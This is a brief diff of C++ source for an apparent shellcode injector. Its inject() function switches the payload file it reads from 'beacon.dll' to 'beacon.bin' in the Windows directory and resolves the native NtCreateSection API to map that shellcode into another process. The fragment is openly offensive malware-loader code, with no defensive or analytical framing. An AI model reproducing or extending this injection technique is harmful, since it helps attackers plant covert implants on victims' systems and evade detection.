@@ -35,7 +35,7 @@ void inject()
         process_info
     );
 
-    std::vector<BYTE> shellcode = read("C:\\Windows\\beacon.dll");
+    std::vector<BYTE> shellcode = read("C:\\Windows\\beacon.bin");
 
     HMODULE hNtdll = GetModuleHandle(L"ntdll.dll");
     NtCreateSection ntCreateSection = (NtCreateSection)GetProcAddress(hNtdll, "NtCreateSection");
